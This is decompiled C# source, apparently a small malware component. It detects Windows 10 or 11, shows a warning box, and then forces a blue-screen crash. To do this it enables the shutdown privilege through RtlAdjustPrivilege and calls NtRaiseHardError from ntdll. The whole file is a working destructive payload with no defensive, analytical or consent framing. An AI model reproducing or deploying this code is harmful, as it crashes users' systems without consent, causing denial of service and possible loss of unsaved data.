using System;
using System.Runtime.InteropServices;

namespace WINDOWS10O11NO
{
	// Token: 0x02000028 RID: 40
	public class Program
	{
		// Token: 0x0600019C RID: 412
		[DllImport("ntdll.dll")]
		public static extern int RtlGetVersion(ref Program.OSVERSIONINFOEX lpVersionInformation);

		// Token: 0x0600019D RID: 413
		[DllImport("ntdll.dll")]
		public static extern int RtlAdjustPrivilege(uint Privilege, bool Enable, bool Client, out bool WasEnabled);

		// Token: 0x0600019E RID: 414
		[DllImport("ntdll.dll")]
		public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		// Token: 0x0600019F RID: 415
		[DllImport("user32.dll")]
		public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, uint uType);

		// Token: 0x060001A0 RID: 416 RVA: 0x0000918C File Offset: 0x0000738C
		public static void ShowWarning()
		{
			Program.MessageBox(IntPtr.Zero, "WINDOWS 10 or 11 ????? ", "Warning", 48U);
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x000091A8 File Offset: 0x000073A8
		public static void CheckAndForceBSOD()
		{
			Program.OSVERSIONINFOEX osversioninfoex = default(Program.OSVERSIONINFOEX);
			osversioninfoex.dwOSVersionInfoSize = Marshal.SizeOf(osversioninfoex);
			bool flag = Program.RtlGetVersion(ref osversioninfoex) == 0;
			if (flag)
			{
				bool flag2 = osversioninfoex.dwMajorVersion == 10 && osversioninfoex.dwBuildNumber >= 10240;
				if (flag2)
				{
					Program.ShowWarning();
					Program.ForceBSOD();
				}
			}
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x00009210 File Offset: 0x00007410
		public static void ForceBSOD()
		{
			bool flag;
			Program.RtlAdjustPrivilege(19U, true, false, out flag);
			uint num;
			Program.NtRaiseHardError(3221226528U, 0U, 0U, IntPtr.Zero, 6U, out num);
		}

		// Token: 0x0200005B RID: 91
		public struct OSVERSIONINFOEX
		{
			// Token: 0x04000137 RID: 311
			public int dwOSVersionInfoSize;

			// Token: 0x04000138 RID: 312
			public int dwMajorVersion;

			// Token: 0x04000139 RID: 313
			public int dwMinorVersion;

			// Token: 0x0400013A RID: 314
			public int dwBuildNumber;

			// Token: 0x0400013B RID: 315
			public int dwPlatformId;

			// Token: 0x0400013C RID: 316
			[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
			public string szCSDVersion;

			// Token: 0x0400013D RID: 317
			public short wServicePackMajor;

			// Token: 0x0400013E RID: 318
			public short wServicePackMinor;

			// Token: 0x0400013F RID: 319
			public short wSuiteMask;

			// Token: 0x04000140 RID: 320
			public byte wProductType;

			// Token: 0x04000141 RID: 321
			public byte wReserved;
		}
	}
}
